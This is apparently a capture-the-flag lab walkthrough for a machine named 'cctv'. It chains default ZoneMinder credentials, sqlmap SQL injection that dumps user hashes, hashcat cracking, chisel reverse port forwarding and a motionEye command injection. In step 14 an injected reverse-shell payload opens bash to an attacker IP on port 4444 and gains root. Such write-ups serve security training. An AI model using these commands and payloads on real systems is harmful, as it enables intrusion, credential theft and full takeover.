#box #zoneminder #SQLi #sqlmap #hashcat #cracking #chisel #reverse-port-forwarding #motioneye #os-command-injection 
1. We run nmap and discover a port 22 and 80 open
2. With feroxbuster we run a scan and discover a `/zm` endpoint referring to zoneminder
3. We authenticate with default creds `admin:admin`
4. We realize that the version is vulnerable to a SQLi vuln by googling online
5. We run `sqlmap` to find users and passwords with
```shell
sqlmap -v 3 --cookie='ZMSESSID=6oqubhlm27mchqtpg5lr8b0d6i' -u 'http://cctv.htb/zm//index.php?view=request&request=event&action=removetag&tid=1' -p tid --dbms=mysql --batch -D zm -T Users -C "Name" --dump -t 50
```
discovering: `<blank>`, `admin` and `mark`
and

```shell
sqlmap -v 3 --cookie='ZMSESSID=6oqubhlm27mchqtpg5lr8b0d6i' -u 'http://cctv.htb/zm//index.php?view=request&request=event&action=removetag&tid=1' -p tid --dbms=mysql --batch -D zm -T Users -C "Password" --dump -t 50
```
discovering those two hashes:

```txt
$2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm
$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m 
```

6. We crack the hashes with hashcat 
```shell
hashcat -m 3200 hashes /usr/share/wordlists/rockyou.txt
```
7.  We try to authenticate in SSH with `mark:opensesame` gaining a foothold
8. Once on the machine we realize that some services are running on various ports, after some curl commands we realize something is running on port 8765. The name is motioneye and its version is **0.43.1b4**
9. Due to the slow connection within a Dynamic Port Forwarding with SSH, we proceed for a reverse dynamic port forwarding with chisel
```shell
sudo ./chisel server --reverse -v -p 1234 --socks5 # ATTACKER 
sudo ./chisel client -v 10.10.16.171:1234 R:socks # VICTIM
```
 10. Finally we can access that port on our end with:
```shell
proxychains firefox http://127.0.0.1:8765
```
11. Landing on the page we discover it asks for a password. After some research we discover a file containing the password of the admin user in cleartext
```shell
cat /etc/motioneye/motion.conf

# @admin_username admin
# @normal_username user
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
# @lang en
# @enabled on
# @normal_password 


setup_mode off
webcontrol_port 7999
webcontrol_interface 1
webcontrol_localhost on
webcontrol_parms 2

camera camera-1.conf
```
12. We authenticate with `admin:989c5a8ee87a0e9521ec81a79187d162109282f0` on the motioneye website.
13. We realize that specific version of motioneye is vulnerable to OS Command Injection https://github.com/advisories/GHSA-j945-qm58-4gjx. We follow this guidelines to properly replicate the vulnerability
14. We then start a listener on port 4444 and use the following script to gain a shell in 10 seconds on our machine, gaining root
```bash
$(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/10.10.16.171/4444 0>&1\"')").%Y-%m-%d-%H-%M-%S
```